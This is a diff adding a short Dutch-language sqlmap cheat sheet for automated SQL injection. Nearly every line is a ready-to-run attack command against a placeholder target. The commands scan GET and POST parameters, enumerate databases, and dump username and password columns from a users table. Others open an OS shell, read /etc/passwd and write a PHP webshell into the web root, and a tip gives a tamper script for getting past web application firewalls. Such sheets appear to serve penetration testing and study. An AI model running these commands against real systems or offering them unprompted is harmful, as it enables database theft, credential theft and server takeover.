@@ -1,0 +1,31 @@
+# SQLMap - Geautomatiseerde SQL Injection
+# === Basis scan ===
+sqlmap -u "http://target/page?id=1" --batch
+# POST data:
+sqlmap -u "http://target/api" --method POST --data "id=1&sort=name" -p id --batch
+# Met cookie:
+sqlmap -u "http://target/page?id=1" --cookie="PHPSESSID=abc123" --batch
+# === Enumeratie ===
+sqlmap -u "http://target/page?id=1" --dbs
+sqlmap -u "http://target/page?id=1" -D dbname --tables
+sqlmap -u "http://target/page?id=1" -D dbname -T users --dump
+# Specifieke kolommen:
+sqlmap -u "http://target/page?id=1" -D dbname -T users -C username,password --dump
+# === Geavanceerd ===
+# OS shell (interactief):
+sqlmap -u "http://target/page?id=1" --os-shell
+# SQL shell:
+sqlmap -u "http://target/page?id=1" --sql-shell
+# File lezen:
+sqlmap -u "http://target/page?id=1" --file-read="/etc/passwd"
+# File schrijven (webshell):
+sqlmap -u "http://target/page?id=1" --file-write="shell.php" --file-dest="/var/www/html/shell.php"
+# === Techniek specificeren ===
+# Alleen UNION: --technique=U
+# Alleen blind: --technique=B
+# Alleen time: --technique=T
+# Alle technieken: --technique=BEUSTQ
+# === Burp request gebruiken ===
+sqlmap -r request.txt --batch
+# Tip: --batch = geen interactieve vragen, --risk=3 --level=5 voor diepere scan
+# Tip: --tamper=space2comment voor WAF bypass
